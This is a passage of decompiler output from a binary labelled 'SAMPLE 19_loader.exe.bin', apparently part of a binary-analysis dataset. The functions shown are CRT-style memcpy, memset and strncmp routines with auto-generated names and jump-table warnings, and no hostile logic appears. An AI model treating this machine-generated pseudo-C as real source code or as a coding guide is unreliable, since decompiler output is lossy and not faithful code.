        case 0x1b7:
        case 0x1b8:
        case 0x1b9:
        case 0x1ba:
        case 0x1bb:
        case 0x1bc:
        case 0x1bd:
        case 0x1be:
        case 0x1bf:
        case 0x1c0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar27[2] + uVar31));
          *(undefined1 (*) [32])(pauVar24[2] + uVar31) = auVar3;
        case 0x181:
        case 0x182:
        case 0x183:
        case 0x184:
        case 0x185:
        case 0x186:
        case 0x187:
        case 0x188:
        case 0x189:
        case 0x18a:
        case 0x18b:
        case 0x18c:
        case 0x18d:
        case 0x18e:
        case 399:
        case 400:
        case 0x191:
        case 0x192:
        case 0x193:
        case 0x194:
        case 0x195:
        case 0x196:
        case 0x197:
        case 0x198:
        case 0x199:
        case 0x19a:
        case 0x19b:
        case 0x19c:
        case 0x19d:
        case 0x19e:
        case 0x19f:
        case 0x1a0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar27[3] + uVar31));
          *(undefined1 (*) [32])(pauVar24[3] + uVar31) = auVar3;
        case 0x161:
        case 0x162:
        case 0x163:
        case 0x164:
        case 0x165:
        case 0x166:
        case 0x167:
        case 0x168:
        case 0x169:
        case 0x16a:
        case 0x16b:
        case 0x16c:
        case 0x16d:
        case 0x16e:
        case 0x16f:
        case 0x170:
        case 0x171:
        case 0x172:
        case 0x173:
        case 0x174:
        case 0x175:
        case 0x176:
        case 0x177:
        case 0x178:
        case 0x179:
        case 0x17a:
        case 0x17b:
        case 0x17c:
        case 0x17d:
        case 0x17e:
        case 0x17f:
        case 0x180:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar27[4] + uVar31));
          *(undefined1 (*) [32])(pauVar24[4] + uVar31) = auVar3;
        case 0x141:
        case 0x142:
        case 0x143:
        case 0x144:
        case 0x145:
        case 0x146:
        case 0x147:
        case 0x148:
        case 0x149:
        case 0x14a:
        case 0x14b:
        case 0x14c:
        case 0x14d:
        case 0x14e:
        case 0x14f:
        case 0x150:
        case 0x151:
        case 0x152:
        case 0x153:
        case 0x154:
        case 0x155:
        case 0x156:
        case 0x157:
        case 0x158:
        case 0x159:
        case 0x15a:
        case 0x15b:
        case 0x15c:
        case 0x15d:
        case 0x15e:
        case 0x15f:
        case 0x160:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar27[5] + uVar31));
          *(undefined1 (*) [32])(pauVar24[5] + uVar31) = auVar3;
        case 0x121:
        case 0x122:
        case 0x123:
        case 0x124:
        case 0x125:
        case 0x126:
        case 0x127:
        case 0x128:
        case 0x129:
        case 0x12a:
        case 299:
        case 300:
        case 0x12d:
        case 0x12e:
        case 0x12f:
        case 0x130:
        case 0x131:
        case 0x132:
        case 0x133:
        case 0x134:
        case 0x135:
        case 0x136:
        case 0x137:
        case 0x138:
        case 0x139:
        case 0x13a:
        case 0x13b:
        case 0x13c:
        case 0x13d:
        case 0x13e:
        case 0x13f:
        case 0x140:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar27[6] + uVar31));
          *(undefined1 (*) [32])(pauVar24[6] + uVar31) = auVar3;
        default:
          puVar25 = (undefined8 *)(pauVar24[-1] + uVar29);
          *puVar25 = uVar32;
          puVar25[1] = uVar33;
          puVar25[2] = uVar14;
          puVar25[3] = uVar15;
        case 0x100:
          *param_1 = uVar10;
          param_1[1] = uVar11;
          param_1[2] = uVar12;
          param_1[3] = uVar13;
          return;
        }
      }
      do {
        uVar10 = *(undefined8 *)(*pauVar26 + 8);
        uVar11 = *(undefined8 *)(*pauVar26 + 0x10);
        uVar12 = *(undefined8 *)(*pauVar26 + 0x18);
        uVar13 = *(undefined8 *)pauVar26[1];
        uVar32 = *(undefined8 *)(pauVar26[1] + 8);
        uVar33 = *(undefined8 *)(pauVar26[1] + 0x10);
        uVar14 = *(undefined8 *)(pauVar26[1] + 0x18);
        uVar15 = *(undefined8 *)pauVar26[2];
        uVar16 = *(undefined8 *)(pauVar26[2] + 8);
        uVar17 = *(undefined8 *)(pauVar26[2] + 0x10);
        uVar18 = *(undefined8 *)(pauVar26[2] + 0x18);
        uVar19 = *(undefined8 *)pauVar26[3];
        uVar20 = *(undefined8 *)(pauVar26[3] + 8);
        uVar21 = *(undefined8 *)(pauVar26[3] + 0x10);
        uVar22 = *(undefined8 *)(pauVar26[3] + 0x18);
        *(undefined8 *)*pauVar23 = *(undefined8 *)*pauVar26;
        *(undefined8 *)(*pauVar23 + 8) = uVar10;
        *(undefined8 *)(*pauVar23 + 0x10) = uVar11;
        *(undefined8 *)(*pauVar23 + 0x18) = uVar12;
        *(undefined8 *)pauVar23[1] = uVar13;
        *(undefined8 *)(pauVar23[1] + 8) = uVar32;
        *(undefined8 *)(pauVar23[1] + 0x10) = uVar33;
        *(undefined8 *)(pauVar23[1] + 0x18) = uVar14;
        *(undefined8 *)pauVar23[2] = uVar15;
        *(undefined8 *)(pauVar23[2] + 8) = uVar16;
        *(undefined8 *)(pauVar23[2] + 0x10) = uVar17;
        *(undefined8 *)(pauVar23[2] + 0x18) = uVar18;
        *(undefined8 *)pauVar23[3] = uVar19;
        *(undefined8 *)(pauVar23[3] + 8) = uVar20;
        *(undefined8 *)(pauVar23[3] + 0x10) = uVar21;
        *(undefined8 *)(pauVar23[3] + 0x18) = uVar22;
        uVar10 = *(undefined8 *)(pauVar26[4] + 8);
        uVar11 = *(undefined8 *)(pauVar26[4] + 0x10);
        uVar12 = *(undefined8 *)(pauVar26[4] + 0x18);
        uVar13 = *(undefined8 *)pauVar26[5];
        uVar32 = *(undefined8 *)(pauVar26[5] + 8);
        uVar33 = *(undefined8 *)(pauVar26[5] + 0x10);
        uVar14 = *(undefined8 *)(pauVar26[5] + 0x18);
        uVar15 = *(undefined8 *)pauVar26[6];
        uVar16 = *(undefined8 *)(pauVar26[6] + 8);
        uVar17 = *(undefined8 *)(pauVar26[6] + 0x10);
        uVar18 = *(undefined8 *)(pauVar26[6] + 0x18);
        uVar19 = *(undefined8 *)pauVar26[7];
        uVar20 = *(undefined8 *)(pauVar26[7] + 8);
        uVar21 = *(undefined8 *)(pauVar26[7] + 0x10);
        uVar22 = *(undefined8 *)(pauVar26[7] + 0x18);
        *(undefined8 *)pauVar23[4] = *(undefined8 *)pauVar26[4];
        *(undefined8 *)(pauVar23[4] + 8) = uVar10;
        *(undefined8 *)(pauVar23[4] + 0x10) = uVar11;
        *(undefined8 *)(pauVar23[4] + 0x18) = uVar12;
        *(undefined8 *)pauVar23[5] = uVar13;
        *(undefined8 *)(pauVar23[5] + 8) = uVar32;
        *(undefined8 *)(pauVar23[5] + 0x10) = uVar33;
        *(undefined8 *)(pauVar23[5] + 0x18) = uVar14;
        *(undefined8 *)pauVar23[6] = uVar15;
        *(undefined8 *)(pauVar23[6] + 8) = uVar16;
        *(undefined8 *)(pauVar23[6] + 0x10) = uVar17;
        *(undefined8 *)(pauVar23[6] + 0x18) = uVar18;
        *(undefined8 *)pauVar23[7] = uVar19;
        *(undefined8 *)(pauVar23[7] + 8) = uVar20;
        *(undefined8 *)(pauVar23[7] + 0x10) = uVar21;
        *(undefined8 *)(pauVar23[7] + 0x18) = uVar22;
        pauVar23 = pauVar23 + 8;
        pauVar26 = pauVar26 + 8;
        param_3 = param_3 - 0x100;
      } while (0xff < param_3);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x0001400221b2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
            *(uint *)(&DAT_140090390 + (param_3 + 0x1f >> 5) * 4)))();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x225d0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400225d0 rva=0x225d0 */

undefined8 FUN_1400225d0(undefined1 *param_1,undefined1 param_2,longlong param_3,undefined8 param_4)

{
  for (; param_3 != 0; param_3 = param_3 + -1) {
    *param_1 = param_2;
    param_1 = param_1 + 1;
  }
  return param_4;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x225e0 | partial_markers_remain ===== */
/* address=1400225e0 rva=0x225e0 */

undefined1 (*) [32] FUN_1400225e0(undefined1 (*param_1) [32],byte param_2,ulonglong param_3)

{
  undefined1 auVar1 [32];
  undefined1 (*pauVar2) [32];
  undefined1 (*pauVar3) [32];
  undefined1 (*pauVar4) [16];
  ulonglong uVar5;
  ulonglong uVar6;
  longlong lVar7;
  undefined1 uVar8;
  undefined2 uVar9;
  undefined4 uVar10;
  longlong lVar11;
  undefined1 auVar12 [16];
  undefined1 auVar13 [32];
  
  uVar5 = (ulonglong)param_2;
  lVar11 = uVar5 * 0x101010101010101;
  uVar8 = (undefined1)lVar11;
  uVar9 = (undefined2)lVar11;
  uVar10 = (undefined4)lVar11;
  switch(param_3) {
  case 0:
    return param_1;
  case 8:
    *(longlong *)(param_1[-1] + param_3 + 0x18) = lVar11;
    return param_1;
  case 9:
    *(longlong *)(param_1[-1] + param_3 + 0x17) = lVar11;
    param_1[-1][param_3 + 0x1f] = uVar8;
    return param_1;
  case 10:
    *(longlong *)(param_1[-1] + param_3 + 0x16) = lVar11;
    *(undefined2 *)(param_1[-1] + param_3 + 0x1e) = uVar9;
    return param_1;
  case 0xb:
    *(longlong *)(param_1[-1] + param_3 + 0x15) = lVar11;
    *(undefined2 *)(param_1[-1] + param_3 + 0x1d) = uVar9;
    param_1[-1][param_3 + 0x1f] = uVar8;
    return param_1;
  case 0xc:
    *(longlong *)(param_1[-1] + param_3 + 0x14) = lVar11;
  case 4:
    *(undefined4 *)(param_1[-1] + param_3 + 0x1c) = uVar10;
    return param_1;
  case 0xd:
    *(longlong *)(param_1[-1] + param_3 + 0x13) = lVar11;
  case 5:
    *(undefined4 *)(param_1[-1] + param_3 + 0x1b) = uVar10;
    param_1[-1][param_3 + 0x1f] = uVar8;
    return param_1;
  case 0xe:
    *(longlong *)(param_1[-1] + param_3 + 0x12) = lVar11;
  case 6:
    *(undefined4 *)(param_1[-1] + param_3 + 0x1a) = uVar10;
  case 2:
    *(undefined2 *)(param_1[-1] + param_3 + 0x1e) = uVar9;
    return param_1;
  case 0xf:
    *(longlong *)(param_1[-1] + param_3 + 0x11) = lVar11;
  case 7:
    *(undefined4 *)(param_1[-1] + param_3 + 0x19) = uVar10;
  case 3:
    *(undefined2 *)(param_1[-1] + param_3 + 0x1d) = uVar9;
  case 1:
    param_1[-1][param_3 + 0x1f] = uVar8;
    return param_1;
  }
  auVar12._8_8_ = lVar11;
  auVar12._0_8_ = lVar11;
  if (param_3 < 0x21) {
    *(undefined1 (*) [16])*param_1 = auVar12;
    *(undefined1 (*) [16])(param_1[-1] + param_3 + 0x10) = auVar12;
    return param_1;
  }
  if (DAT_1400dfc88 < 3) {
    if ((param_3 <= DAT_1400dfc90) || (((byte)DAT_1400e0794 & 2) == 0)) {
      lVar11 = ((ulonglong)param_1 & 0xf) - 0x10;
      pauVar4 = (undefined1 (*) [16])((longlong)param_1 - lVar11);
      uVar6 = param_3 + lVar11;
      if (0x80 < uVar6) {
        do {
          *pauVar4 = auVar12;
          pauVar4[1] = auVar12;
          pauVar4[2] = auVar12;
          pauVar4[3] = auVar12;
          pauVar4[4] = auVar12;
          pauVar4[5] = auVar12;
          pauVar4[6] = auVar12;
          pauVar4[7] = auVar12;
          pauVar4 = pauVar4 + 8;
          uVar6 = uVar6 - 0x80;
        } while (0x7f < uVar6);
      }
                    /* WARNING: Could not recover jumptable at 0x000140022928. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pauVar2 = (undefined1 (*) [32])
                (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
                          *(uint *)(&DAT_140090488 + (uVar6 + 0xf >> 4) * 4)))
                          (pauVar4,uVar5 - lVar11);
      return pauVar2;
    }
  }
  else if (((param_3 <= DAT_1400dfc90) || (DAT_1400dfc98 < param_3)) ||
          (((byte)DAT_1400e0794 & 2) == 0)) {
    auVar13._16_16_ = auVar12;
    auVar13._0_16_ = auVar12;
    lVar7 = ((ulonglong)param_1 & 0x1f) - 0x20;
    pauVar2 = (undefined1 (*) [32])((longlong)param_1 - lVar7);
    uVar6 = param_3 + lVar7;
    if (0x100 < uVar6) {
      if (DAT_1400dfc98 < uVar6) {
        do {
          uVar5 = uVar6;
          pauVar3 = pauVar2;
          auVar1 = vmovntdq_avx(auVar13);
          *pauVar3 = auVar1;
          auVar1 = vmovntdq_avx(auVar13);
          pauVar3[1] = auVar1;
          auVar1 = vmovntdq_avx(auVar13);
          pauVar3[2] = auVar1;
          auVar1 = vmovntdq_avx(auVar13);
          pauVar3[3] = auVar1;
          auVar1 = vmovntdq_avx(auVar13);
          pauVar3[4] = auVar1;
          auVar1 = vmovntdq_avx(auVar13);
          pauVar3[5] = auVar1;
          auVar1 = vmovntdq_avx(auVar13);
          pauVar3[6] = auVar1;
          auVar1 = vmovntdq_avx(auVar13);
          pauVar3[7] = auVar1;
          pauVar2 = pauVar3 + 8;
          uVar6 = uVar5 - 0x100;
        } while (0xff < uVar5 - 0x100);
        uVar6 = uVar5 - 0xe1 & 0xffffffffffffffe0;
        switch(uVar5) {
        case 0x1e1:
        case 0x1e2:
        case 0x1e3:
        case 0x1e4:
        case 0x1e5:
        case 0x1e6:
        case 0x1e7:
        case 0x1e8:
        case 0x1e9:
        case 0x1ea:
        case 0x1eb:
        case 0x1ec:
        case 0x1ed:
        case 0x1ee:
        case 0x1ef:
        case 0x1f0:
        case 0x1f1:
        case 0x1f2:
        case 499:
        case 500:
        case 0x1f5:
        case 0x1f6:
        case 0x1f7:
        case 0x1f8:
        case 0x1f9:
        case 0x1fa:
        case 0x1fb:
        case 0x1fc:
        case 0x1fd:
        case 0x1fe:
        case 0x1ff:
          auVar1 = vmovntdq_avx(auVar13);
          *(undefined1 (*) [32])(*pauVar3 + uVar6) = auVar1;
        case 0x1c1:
        case 0x1c2:
        case 0x1c3:
        case 0x1c4:
        case 0x1c5:
        case 0x1c6:
        case 0x1c7:
        case 0x1c8:
        case 0x1c9:
        case 0x1ca:
        case 0x1cb:
        case 0x1cc:
        case 0x1cd:
        case 0x1ce:
        case 0x1cf:
        case 0x1d0:
        case 0x1d1:
        case 0x1d2:
        case 0x1d3:
        case 0x1d4:
        case 0x1d5:
        case 0x1d6:
        case 0x1d7:
        case 0x1d8:
        case 0x1d9:
        case 0x1da:
        case 0x1db:
        case 0x1dc:
        case 0x1dd:
        case 0x1de:
        case 0x1df:
        case 0x1e0:
          auVar1 = vmovntdq_avx(auVar13);
          *(undefined1 (*) [32])(pauVar3[1] + uVar6) = auVar1;
        case 0x1a1:
        case 0x1a2:
        case 0x1a3:
        case 0x1a4:
        case 0x1a5:
        case 0x1a6:
        case 0x1a7:
        case 0x1a8:
        case 0x1a9:
        case 0x1aa:
        case 0x1ab:
        case 0x1ac:
        case 0x1ad:
        case 0x1ae:
        case 0x1af:
        case 0x1b0:
        case 0x1b1:
        case 0x1b2:
        case 0x1b3:
        case 0x1b4:
        case 0x1b5:
        case 0x1b6:
        case 0x1b7:
        case 0x1b8:
        case 0x1b9:
        case 0x1ba:
        case 0x1bb:
        case 0x1bc:
        case 0x1bd:
        case 0x1be:
        case 0x1bf:
        case 0x1c0:
          auVar1 = vmovntdq_avx(auVar13);
          *(undefined1 (*) [32])(pauVar3[2] + uVar6) = auVar1;
        case 0x181:
        case 0x182:
        case 0x183:
        case 0x184:
        case 0x185:
        case 0x186:
        case 0x187:
        case 0x188:
        case 0x189:
        case 0x18a:
        case 0x18b:
        case 0x18c:
        case 0x18d:
        case 0x18e:
        case 399:
        case 400:
        case 0x191:
        case 0x192:
        case 0x193:
        case 0x194:
        case 0x195:
        case 0x196:
        case 0x197:
        case 0x198:
        case 0x199:
        case 0x19a:
        case 0x19b:
        case 0x19c:
        case 0x19d:
        case 0x19e:
        case 0x19f:
        case 0x1a0:
          auVar1 = vmovntdq_avx(auVar13);
          *(undefined1 (*) [32])(pauVar3[3] + uVar6) = auVar1;
        case 0x161:
        case 0x162:
        case 0x163:
        case 0x164:
        case 0x165:
        case 0x166:
        case 0x167:
        case 0x168:
        case 0x169:
        case 0x16a:
        case 0x16b:
        case 0x16c:
        case 0x16d:
        case 0x16e:
        case 0x16f:
        case 0x170:
        case 0x171:
        case 0x172:
        case 0x173:
        case 0x174:
        case 0x175:
        case 0x176:
        case 0x177:
        case 0x178:
        case 0x179:
        case 0x17a:
        case 0x17b:
        case 0x17c:
        case 0x17d:
        case 0x17e:
        case 0x17f:
        case 0x180:
          auVar1 = vmovntdq_avx(auVar13);
          *(undefined1 (*) [32])(pauVar3[4] + uVar6) = auVar1;
        case 0x141:
        case 0x142:
        case 0x143:
        case 0x144:
        case 0x145:
        case 0x146:
        case 0x147:
        case 0x148:
        case 0x149:
        case 0x14a:
        case 0x14b:
        case 0x14c:
        case 0x14d:
        case 0x14e:
        case 0x14f:
        case 0x150:
        case 0x151:
        case 0x152:
        case 0x153:
        case 0x154:
        case 0x155:
        case 0x156:
        case 0x157:
        case 0x158:
        case 0x159:
        case 0x15a:
        case 0x15b:
        case 0x15c:
        case 0x15d:
        case 0x15e:
        case 0x15f:
        case 0x160:
          auVar1 = vmovntdq_avx(auVar13);
          *(undefined1 (*) [32])(pauVar3[5] + uVar6) = auVar1;
        case 0x121:
        case 0x122:
        case 0x123:
        case 0x124:
        case 0x125:
        case 0x126:
        case 0x127:
        case 0x128:
        case 0x129:
        case 0x12a:
        case 299:
        case 300:
        case 0x12d:
        case 0x12e:
        case 0x12f:
        case 0x130:
        case 0x131:
        case 0x132:
        case 0x133:
        case 0x134:
        case 0x135:
        case 0x136:
        case 0x137:
        case 0x138:
        case 0x139:
        case 0x13a:
        case 0x13b:
        case 0x13c:
        case 0x13d:
        case 0x13e:
        case 0x13f:
        case 0x140:
          auVar1 = vmovntdq_avx(auVar13);
          *(undefined1 (*) [32])(pauVar3[6] + uVar6) = auVar1;
        default:
          *(undefined1 (*) [32])(pauVar3[-1] + uVar5) = auVar13;
        case 0x100:
          *param_1 = auVar13;
          return param_1;
        }
      }
      do {
        *pauVar2 = auVar13;
        pauVar2[1] = auVar13;
        pauVar2[2] = auVar13;
        pauVar2[3] = auVar13;
        pauVar2[4] = auVar13;
        pauVar2[5] = auVar13;
        pauVar2[6] = auVar13;
        pauVar2[7] = auVar13;
        pauVar2 = pauVar2 + 8;
        uVar6 = uVar6 - 0x100;
      } while (0xff < uVar6);
    }
                    /* WARNING: Could not recover jumptable at 0x000140022774. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    pauVar2 = (undefined1 (*) [32])
              (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
                        *(uint *)(&DAT_140090440 + (uVar6 + 0x1f >> 5) * 4)))(lVar11,uVar5 - lVar7);
    return pauVar2;
  }
  pauVar2 = param_1;
  for (; param_3 != 0; param_3 = param_3 - 1) {
    (*pauVar2)[0] = param_2;
    pauVar2 = (undefined1 (*) [32])(*pauVar2 + 1);
  }
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22990 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022990 rva=0x22990 */

ulonglong FUN_140022990(ulonglong *param_1,longlong param_2,ulonglong param_3)

{
  byte bVar1;
  ulonglong uVar2;
  longlong lVar3;
  bool bVar4;
  
  lVar3 = param_2 - (longlong)param_1;
  if (param_3 != 0) {
    do {
      if (((ulonglong)param_1 & 7) == 0) {
        while ((((int)lVar3 + (int)param_1 & 0xfffU) < 0xff9 &&
               (uVar2 = *param_1, uVar2 == *(ulonglong *)(lVar3 + (longlong)param_1)))) {
          param_1 = param_1 + 1;
          bVar4 = param_3 < 8;
          param_3 = param_3 - 8;
          if (bVar4 || param_3 == 0) {
            return 0;
          }
          if ((~uVar2 & uVar2 + 0xfefefefefefefeff & 0x8080808080808080) != 0) {
            return 0;
          }
        }
      }
      bVar1 = (byte)*param_1;
      if (bVar1 != *(byte *)(lVar3 + (longlong)param_1)) {
        return -(ulonglong)(bVar1 < *(byte *)(lVar3 + (longlong)param_1)) | 1;
      }
      param_1 = (ulonglong *)((longlong)param_1 + 1);
      param_3 = param_3 - 1;
    } while ((param_3 != 0) && (bVar1 != 0));
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22a20 | partial_markers_remain ===== */
/* address=140022a20 rva=0x22a20 */

undefined1 (*) [64] FUN_140022a20(undefined1 (*param_1) [64],longlong param_2,ulonglong param_3)

{
  undefined1 auVar1 [32];
  undefined1 (*pauVar2) [64];
  undefined1 (*pauVar3) [64];
  ulonglong uVar4;
  ulonglong uVar5;
  longlong lVar6;
  undefined1 auVar7 [64];
  undefined1 auVar8 [64];
  undefined1 auVar9 [32];
  
  if (param_3 < 0x41) {
    auVar7 = vpbroadcastb_avx512bw();
    auVar7 = vmovdqu8_avx512bw(auVar7);
    *param_1 = auVar7;
    return param_1;
  }
  if (param_3 < 0x81) {
    auVar8 = vpbroadcastb_avx512bw();
    auVar7 = vmovdqu8_avx512bw(auVar8);
    *param_1 = auVar7;
    auVar7 = vmovdqu8_avx512bw(auVar8);
    param_1[1] = auVar7;
    return param_1;
  }
  if ((0x80000 < param_3) && (param_3 < 0x2000001)) {
    pauVar2 = param_1;
    for (; param_3 != 0; param_3 = param_3 - 1) {
      (*pauVar2)[0] = (char)param_2;
      pauVar2 = (undefined1 (*) [64])(*pauVar2 + 1);
    }
    return param_1;
  }
  auVar7 = vpbroadcastb_avx512bw();
  lVar6 = ((ulonglong)param_1 & 0x3f) - 0x40;
  pauVar2 = (undefined1 (*) [64])((longlong)param_1 - lVar6);
  uVar4 = param_3 + lVar6;
  if (0x100 < uVar4) {
    if (0x2000000 < uVar4) {
      do {
        uVar5 = uVar4;
        pauVar3 = pauVar2;
        auVar8 = vmovntdq_avx512f(auVar7);
        *pauVar3 = auVar8;
        auVar8 = vmovntdq_avx512f(auVar7);
        pauVar3[1] = auVar8;
        auVar8 = vmovntdq_avx512f(auVar7);
        pauVar3[2] = auVar8;
        auVar8 = vmovntdq_avx512f(auVar7);
        pauVar3[3] = auVar8;
        pauVar2 = pauVar3 + 4;
        uVar4 = uVar5 - 0x100;
      } while (0xff < uVar5 - 0x100);
      uVar4 = uVar5 - 0xe1 & 0xffffffffffffffe0;
      auVar9 = auVar7._0_32_;
      switch(uVar5) {
      case 0x1e1:
      case 0x1e2:
      case 0x1e3:
      case 0x1e4:
      case 0x1e5:
      case 0x1e6:
      case 0x1e7:
      case 0x1e8:
      case 0x1e9:
      case 0x1ea:
      case 0x1eb:
      case 0x1ec:
      case 0x1ed:
      case 0x1ee:
      case 0x1ef:
      case 0x1f0:
      case 0x1f1:
      case 0x1f2:
      case 499:
      case 500:
      case 0x1f5:
      case 0x1f6:
      case 0x1f7:
      case 0x1f8:
      case 0x1f9:
      case 0x1fa:
      case 0x1fb:
      case 0x1fc:
      case 0x1fd:
      case 0x1fe:
      case 0x1ff:
        auVar1 = vmovntdq_avx(auVar9);
        *(undefined1 (*) [32])(*pauVar3 + uVar4) = auVar1;
      case 0x1c1:
      case 0x1c2:
      case 0x1c3:
      case 0x1c4:
      case 0x1c5:
      case 0x1c6:
      case 0x1c7:
      case 0x1c8:
      case 0x1c9:
      case 0x1ca:
      case 0x1cb:
      case 0x1cc:
      case 0x1cd:
      case 0x1ce:
      case 0x1cf:
      case 0x1d0:
      case 0x1d1:
      case 0x1d2:
      case 0x1d3:
      case 0x1d4:
      case 0x1d5:
      case 0x1d6:
      case 0x1d7:
      case 0x1d8:
      case 0x1d9:
      case 0x1da:
      case 0x1db:
      case 0x1dc:
      case 0x1dd:
      case 0x1de:
      case 0x1df:
      case 0x1e0:
        auVar1 = vmovntdq_avx(auVar9);
        *(undefined1 (*) [32])(*pauVar3 + uVar4 + 0x20) = auVar1;
      case 0x1a1:
      case 0x1a2:
      case 0x1a3:
      case 0x1a4:
      case 0x1a5:
      case 0x1a6:
      case 0x1a7:
      case 0x1a8:
      case 0x1a9:
      case 0x1aa:
      case 0x1ab:
      case 0x1ac:
      case 0x1ad:
      case 0x1ae:
      case 0x1af:
      case 0x1b0:
      case 0x1b1:
      case 0x1b2:
      case 0x1b3:
      case 0x1b4:
      case 0x1b5:
      case 0x1b6:
      case 0x1b7:
      case 0x1b8:
      case 0x1b9:
      case 0x1ba:
      case 0x1bb:
      case 0x1bc:
      case 0x1bd:
      case 0x1be:
      case 0x1bf:
      case 0x1c0:
        auVar1 = vmovntdq_avx(auVar9);
        *(undefined1 (*) [32])(pauVar3[1] + uVar4) = auVar1;
      case 0x181:
      case 0x182:
      case 0x183:
      case 0x184:
      case 0x185:
      case 0x186:
      case 0x187:
      case 0x188:
      case 0x189:
      case 0x18a:
      case 0x18b:
      case 0x18c:
      case 0x18d:
      case 0x18e:
      case 399:
      case 400:
      case 0x191:
      case 0x192:
      case 0x193:
      case 0x194:
      case 0x195:
      case 0x196:
      case 0x197:
      case 0x198:
      case 0x199:
      case 0x19a:
      case 0x19b:
      case 0x19c:
      case 0x19d:
      case 0x19e:
      case 0x19f:
      case 0x1a0:
        auVar1 = vmovntdq_avx(auVar9);
        *(undefined1 (*) [32])(pauVar3[1] + uVar4 + 0x20) = auVar1;
      case 0x161:
      case 0x162:
      case 0x163:
      case 0x164:
      case 0x165:
      case 0x166:
      case 0x167:
      case 0x168:
      case 0x169:
      case 0x16a:
      case 0x16b:
      case 0x16c:
      case 0x16d:
      case 0x16e:
      case 0x16f:
      case 0x170:
      case 0x171:
      case 0x172:
      case 0x173:
      case 0x174:
      case 0x175:
      case 0x176:
      case 0x177:
      case 0x178:
      case 0x179:
      case 0x17a:
      case 0x17b:
      case 0x17c:
      case 0x17d:
      case 0x17e:
      case 0x17f:
      case 0x180:
        auVar1 = vmovntdq_avx(auVar9);
        *(undefined1 (*) [32])(pauVar3[2] + uVar4) = auVar1;
      case 0x141:
      case 0x142:
      case 0x143:
      case 0x144:
      case 0x145:
      case 0x146:
      case 0x147:
      case 0x148:
      case 0x149:
      case 0x14a:
      case 0x14b:
      case 0x14c:
      case 0x14d:
      case 0x14e:
      case 0x14f:
      case 0x150:
      case 0x151:
      case 0x152:
      case 0x153:
      case 0x154:
      case 0x155:
      case 0x156:
      case 0x157:
      case 0x158:
      case 0x159:
      case 0x15a:
      case 0x15b:
      case 0x15c:
      case 0x15d:
      case 0x15e:
      case 0x15f:
      case 0x160:
        auVar1 = vmovntdq_avx(auVar9);
        *(undefined1 (*) [32])(pauVar3[2] + uVar4 + 0x20) = auVar1;
      case 0x121:
      case 0x122:
      case 0x123:
      case 0x124:
      case 0x125:
      case 0x126:
      case 0x127:
      case 0x128:
      case 0x129:
      case 0x12a:
      case 299:
      case 300:
      case 0x12d:
      case 0x12e:
      case 0x12f:
      case 0x130:
      case 0x131:
      case 0x132:
      case 0x133:
      case 0x134:
      case 0x135:
      case 0x136:
      case 0x137:
      case 0x138:
      case 0x139:
      case 0x13a:
      case 0x13b:
      case 0x13c:
      case 0x13d:
      case 0x13e:
      case 0x13f:
      case 0x140:
        auVar1 = vmovntdq_avx(auVar9);
        *(undefined1 (*) [32])(pauVar3[3] + uVar4) = auVar1;
      default:
        auVar9 = vmovdqu8_avx512vl(auVar9);
        *(undefined1 (*) [32])(pauVar3[-1] + uVar5 + 0x20) = auVar9;
      case 0x100:
        auVar7 = vmovdqu8_avx512bw(auVar7);
        *param_1 = auVar7;
        return param_1;
      }
    }
    do {
      auVar8 = vmovdqa64_avx512f(auVar7);
      *pauVar2 = auVar8;
      auVar8 = vmovdqa64_avx512f(auVar7);
      pauVar2[1] = auVar8;
      auVar8 = vmovdqa64_avx512f(auVar7);
      pauVar2[2] = auVar8;
      auVar8 = vmovdqa64_avx512f(auVar7);
      pauVar2[3] = auVar8;
      pauVar2 = pauVar2 + 4;
      uVar4 = uVar4 - 0x100;
    } while (0xff < uVar4);
  }
                    /* WARNING: Could not recover jumptable at 0x000140022b2c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pauVar2 = (undefined1 (*) [64])
            (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
                      *(uint *)(&DAT_1400904b0 + (uVar4 + 0x1f >> 5) * 4)))
                      (auVar7._0_8_,param_2 - lVar6);
  return pauVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22c50 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022c50 rva=0x22c50 */

void FUN_140022c50(longlong param_1,undefined8 *param_2)

{
  undefined1 local_31;
  undefined8 *local_30;
  undefined8 local_28;
  undefined8 uStack_20;
  undefined8 local_18;
  longlong local_10;
  undefined1 *local_8;
  
  local_30 = &local_28;
  if (*(int *)(param_1 + 0x18) != 0) {
    local_18 = param_2[2];
    local_28 = *param_2;
    uStack_20 = param_2[1];
    local_8 = &local_31;
    local_10 = param_1;
    FUN_140022dc8((uint *)(param_1 + 0x18),'\x01',&local_30,0x140088800);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22ca6 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022ca6 rva=0x22ca6 */

void FUN_140022ca6(undefined8 param_1)

{
  undefined1 local_21;
  undefined8 local_20;
  undefined1 *local_18;
  undefined1 *local_10;
  undefined8 *local_8;
  
  local_8 = &local_20;
  if (DAT_1400defb0 != 0) {
    local_18 = &DAT_1400def58;
    local_10 = &local_21;
    local_20 = param_1;
    FUN_140022dc8((uint *)&DAT_1400defb0,'\x01',&local_8,0x140088780);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x22cf8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140022cf8 rva=0x22cf8 */

void FUN_140022cf8(ulonglong *param_1,LPVOID param_2,longlong param_3,ulonglong param_4,
